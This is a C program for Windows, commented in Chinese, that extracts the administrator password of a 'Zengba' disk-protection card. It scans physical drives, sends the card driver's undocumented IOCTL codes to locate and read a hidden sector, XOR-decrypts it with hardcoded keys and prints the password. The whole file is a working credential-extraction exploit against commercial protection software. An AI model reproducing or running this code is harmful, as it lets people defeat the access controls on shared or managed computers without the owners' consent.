#include <windows.h>
#include <stdio.h>

int main() {
    HANDLE hDevice = INVALID_HANDLE_VALUE;
    unsigned __int64 baseLBA = 0;
    DWORD dwBytesReturned;

    // 1. 遍历物理磁盘，找到存储增霸卡信息的磁盘并获取基地址(LBA)
    for (int diskIndex = 0; diskIndex < 20; ++diskIndex) {
        char deviceName[50];
        sprintf_s(deviceName, sizeof(deviceName), "\\\\.\\PhysicalDrive%d", diskIndex);
      
        hDevice = CreateFileA(deviceName, 
                              GENERIC_READ | GENERIC_WRITE, 
                              FILE_SHARE_READ | FILE_SHARE_WRITE, 
                              NULL, 
                              OPEN_EXISTING, 
                              0, 
                              NULL);
      
        if (hDevice == INVALID_HANDLE_VALUE) {
            continue;
        }

        __int64 inBuffer = 0;
        // 发送 IOCTL_ZENGBA_GET_LBA 控制码 (0x72054) 获取基地址
        BOOL bResult = DeviceIoControl(hDevice, 0x72054, &inBuffer, 8, &inBuffer, 8, &dwBytesReturned, NULL);
      
        if (bResult && inBuffer != 0) {
            baseLBA = inBuffer;
            printf("Found Zengba Card data on PhysicalDrive%d. Base LBA: %llu\n", diskIndex, baseLBA);
            break; // 找到后退出循环
        }
      
        CloseHandle(hDevice);
        hDevice = INVALID_HANDLE_VALUE;
    }

    if (baseLBA == 0) {
        printf("Error: Could not find a drive with Zengba Card data.\n");
        return 1;
    }

    // 2. 读取存储密码的扇区
    BYTE sectorBuffer[512] = {0};
    DWORD* pBuffer = (DWORD*)sectorBuffer;
  
    // 目标扇区地址 = 基地址 + 偏移量
    unsigned __int64 targetLba = baseLBA + 6410;
  
    // 准备 DeviceIoControl 的输入缓冲区
    pBuffer[0] = (DWORD)targetLba;
    pBuffer[1] = (DWORD)(targetLba >> 32);
    pBuffer[2] = 1; // 读取1个扇区

    printf("Reading sector at LBA: %llu\n", targetLba);
  
    // 发送 IOCTL_ZENGBA_READ_SECTOR 控制码 (0x7201C) 读取扇区
    BOOL bResult = DeviceIoControl(hDevice, 0x7201C, sectorBuffer, 512, sectorBuffer, 512, &dwBytesReturned, NULL);
  
    if (!bResult) {
        printf("Error: Failed to read sector. LastError: %d\n", GetLastError());
        CloseHandle(hDevice);
        return 1;
    }

    // 3. 解密数据
    printf("Decrypting password...\n");
    pBuffer[0] ^= 0x48414947u; // 使用第一个密钥 "GIAG"
    pBuffer[1] ^= 0x55414E47u; // 使用第二个密钥 "GUANG"

    // 4. 输出密码
    printf("\n--- Password Found ---\n");
    printf("Hexadecimal (first 32 bytes): ");
    for (int i = 0; i < 32; ++i) {
        printf("%02X ", sectorBuffer[i]);
    }
    printf("\n");
  
    // 检查密码是否是有效的ASCII字符串
    printf("Password as String: %s\n", (char*)sectorBuffer);
    printf("----------------------\n");

    CloseHandle(hDevice);
    return 0;
}
